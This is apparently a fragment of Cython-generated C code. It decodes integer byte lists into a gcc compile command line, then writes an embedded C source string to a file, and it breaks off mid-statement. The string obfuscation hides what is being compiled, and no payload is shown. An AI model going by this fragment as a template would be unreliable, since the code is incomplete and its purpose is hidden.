__Pyx_GIVEREF(__pyx_int_46);\n  PyList_SET_ITEM(__p""yx_t_3, 0, __pyx_int_46);\n\n\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5688, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5689, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5690, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5690, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5690, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5692, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);\n\n\n  __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5691, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5692, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5690, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_5, 0, long, 1, __Pyx""_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5692, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5692, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5694, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_46);\n  __Pyx_GIVEREF(__pyx_int_46);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_46);\n\n\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5693, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5694, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5692, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, -1L, NULL, NULL, &__pyx_slice__2, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5694, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyUnicode_Join(((PyObject*)__pyx_t_3), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5689, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_1) < 0) __PYX_ERR(0, 5688, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyList_New(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5698, __pyx_L1_error"")\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_INCREF(__pyx_int_103);\n  __Pyx_GIVEREF(__pyx_int_103);\n  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_103);\n  __Pyx_INCREF(__pyx_int_99);\n  __Pyx_GIVEREF(__pyx_int_99);\n  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_99);\n  __Pyx_INCREF(__pyx_int_99);\n  __Pyx_GIVEREF(__pyx_int_99);\n  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_99);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_45);\n  __Pyx_GIVEREF(__pyx_int_45);\n  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_45);\n  __Pyx_INCREF(__pyx_int_73);\n  __Pyx_GIVEREF(__pyx_int_73);\n  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_73);\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5698, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5698, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5699, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5698, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(15); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5700, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_47);\n  __Pyx_GIVEREF(__pyx_int_47);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_47);\n  __Pyx_INCREF(__pyx_int_105);\n  __Pyx_GIVEREF(__pyx_int_105);\n  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_105);\n  __Pyx_INCREF(__pyx_int_110);\n  __Pyx_GIVEREF(__pyx_int_110);\n  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_110);\n  __Pyx_INCREF(__pyx_int""_99);\n  __Pyx_GIVEREF(__pyx_int_99);\n  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_99);\n  __Pyx_INCREF(__pyx_int_108);\n  __Pyx_GIVEREF(__pyx_int_108);\n  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_108);\n  __Pyx_INCREF(__pyx_int_117);\n  __Pyx_GIVEREF(__pyx_int_117);\n  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_117);\n  __Pyx_INCREF(__pyx_int_100);\n  __Pyx_GIVEREF(__pyx_int_100);\n  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_100);\n  __Pyx_INCREF(__pyx_int_101);\n  __Pyx_GIVEREF(__pyx_int_101);\n  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_101);\n  __Pyx_INCREF(__pyx_int_47);\n  __Pyx_GIVEREF(__pyx_int_47);\n  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_47);\n  __Pyx_INCREF(__pyx_int_112);\n  __Pyx_GIVEREF(__pyx_int_112);\n  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_112);\n  __Pyx_INCREF(__pyx_int_121);\n  __Pyx_GIVEREF(__pyx_int_121);\n  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_121);\n  __Pyx_INCREF(__pyx_int_116);\n  __Pyx_GIVEREF(__pyx_int_116);\n  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_116);\n  __Pyx_INCREF(__pyx_int_104);\n  __Pyx_GIVEREF(__pyx_int_104);\n  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_104);\n  __Pyx_INCREF(__pyx_int_111);\n  __Pyx_GIVEREF(__pyx_int_111);\n  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_111);\n  __Pyx_INCREF(__pyx_int_110);\n  __Pyx_GIVEREF(__pyx_int_110);\n  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_110);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5700, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5700, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5699, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = ""0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5701, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5700, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5702, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_45);\n  __Pyx_GIVEREF(__pyx_int_45);\n  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);\n  __Pyx_INCREF(__pyx_int_111);\n  __Pyx_GIVEREF(__pyx_int_111);\n  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_111);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_32);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5702, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5702, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5701, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5703, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5702, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __p""yx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5704, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5704, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5704, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5703, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5705, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5704, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5706, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_45);\n  __Pyx_GIVEREF(__pyx_int_45);\n  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);\n  __Pyx_INCREF(__pyx_int_76);\n  __Pyx_GIVEREF(__pyx_int_76);\n  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_76);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5706, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx""_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5706, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5705, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5707, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5706, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5708, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_47);\n  __Pyx_GIVEREF(__pyx_int_47);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_47);\n  __Pyx_INCREF(__pyx_int_108);\n  __Pyx_GIVEREF(__pyx_int_108);\n  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_108);\n  __Pyx_INCREF(__pyx_int_105);\n  __Pyx_GIVEREF(__pyx_int_105);\n  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_105);\n  __Pyx_INCREF(__pyx_int_98);\n  __Pyx_GIVEREF(__pyx_int_98);\n  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_98);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_45);\n  __Pyx_GIVEREF(__pyx_int_45);\n  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_45);\n  __Pyx_INCREF(__pyx_int_108);\n  __Pyx_GIVEREF(__pyx_int_108);\n  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_108);\n  __Pyx_INCREF(__pyx_int_112);\n  __Pyx_GIVEREF(__pyx_int_112);\n  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_112);\n  __Pyx_INCREF(__pyx_int_121);\n  __Pyx_GIVEREF(__pyx_int_121);\n  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_121);\n  __Pyx_INCREF(__pyx_int_116);\n  __Pyx_GIVEREF(__pyx_int_116);\n  PyList""_SET_ITEM(__pyx_t_2, 9, __pyx_int_116);\n  __Pyx_INCREF(__pyx_int_104);\n  __Pyx_GIVEREF(__pyx_int_104);\n  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_104);\n  __Pyx_INCREF(__pyx_int_111);\n  __Pyx_GIVEREF(__pyx_int_111);\n  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_111);\n  __Pyx_INCREF(__pyx_int_110);\n  __Pyx_GIVEREF(__pyx_int_110);\n  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_110);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5708, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5708, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5707, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5709, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5708, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_COMPILE_FILE, __pyx_t_3) < 0) __PYX_ERR(0, 5697, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  /*with:*/ {\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_INCREF(__pyx_int_119);\n    __Pyx_GIVEREF(__pyx_int_119);\n    PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_119);""\n    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_GIVEREF(__pyx_t_3);\n    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);\n    __Pyx_GIVEREF(__pyx_t_2);\n    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);\n    __pyx_t_3 = 0;\n    __pyx_t_2 = 0;\n    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 5713, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5713, __pyx_L3_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5713, __pyx_L3_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_1 = __pyx_t_3;\n    __pyx_t_3 = 0;\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    /*try:*/ {\n      {\n        __Pyx_PyThreadState_declare\n        __Pyx_PyThreadState_assign\n        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);\n        __Pyx_XGOTREF(__pyx_t_7);\n        __Pyx_XGOTREF(__pyx_t_8);\n        __Pyx_XGOTREF(__pyx_t_9);\n        /*try:*/ {\n          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_1) < 0) __PYX_ERR(0, 5713, __pyx_L7_error)\n          __Py""x_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_f); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5714, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_1);\n          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5714, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_2);\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_C_SOURCE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5714, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_1);\n          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5714, __pyx_L7_error)\n          __Pyx_GOTREF(__pyx_t_3);\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n        }\n        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        goto __pyx_L12_try_end;\n        __pyx_L7_error:;\n        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        /*except:*/ {\n          __Pyx_AddTraceback(\"source\", __pyx_clineno, __pyx_lineno, __pyx_filename);\n          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 5713, __pyx_L9_except_error)\n          __Pyx_GOTREF(__pyx_t_3);\n          __Pyx_GOTREF(__pyx_t_1);\n          __Pyx_GOTREF(__pyx_t_2);\n          __pyx_t_5 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5713, __pyx_L9_except_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_6, 